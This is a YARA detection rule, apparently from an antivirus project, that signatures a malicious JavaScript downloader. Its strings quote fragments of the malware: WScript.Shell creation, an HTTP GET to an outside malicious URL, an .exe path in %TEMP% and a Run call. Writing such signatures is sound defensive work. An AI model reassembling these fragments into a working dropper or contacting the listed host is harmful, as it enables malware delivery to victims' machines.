rule sig_20160329_715cb0da4cc2259e67fde1c71f13533b {
  meta:
    description = "datamaliciousorder - file 20160329_715cb0da4cc2259e67fde1c71f13533b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "eac9cf8a44302122234248097c34fca60af508d7699f98b74af2297ba1d445f2"

  strings:
    $s1  = "function j() {return k0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"uYSKpIWSEPs.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[bT](b() * 11); if (if0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "var k0 = function y() {return WScript[hc](\"WScript.Shell\");}(), mr = 11;" fullword ascii
    $s4  = "if0[Ks](\"GET\", \"http://cngfloristsundries.co.uk/mo4erp\", false);" fullword ascii
    $s5  = "function ZC(i0, vS){e = e * 1; return i0 - vS;};" fullword ascii
    $s6  = "function N(){return \"\" + nn;};" fullword ascii
    $s7  = "function i(UX){k0[\"Run\"](UX, e, e);};" fullword ascii
    $s8  = "function M() {return ((Bn == true) && (Bn == na)) ? 1 : e;};" fullword ascii
    $s9  = "function b(){return 22;};" fullword ascii
    $s10 = "function dV()" fullword ascii
    $s11 = "var iR = new this[\"Date\"]();" fullword ascii
    $s12 = "return ZC(A, ue);" fullword ascii
    $s13 = "function W(){return hc;};" fullword ascii
    $s14 = " while (AC){" fullword ascii
    $s15 = "function k(za) {var f = (1, 2, 3, 4, 5, za); return f;};" fullword ascii
    $s16 = "var c = false;" fullword ascii
    $s17 = "na = true; " fullword ascii
    $s18 = "Bn = true; " fullword ascii
    $s19 = "var na = false;" fullword ascii
    $s20 = "var Bn = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}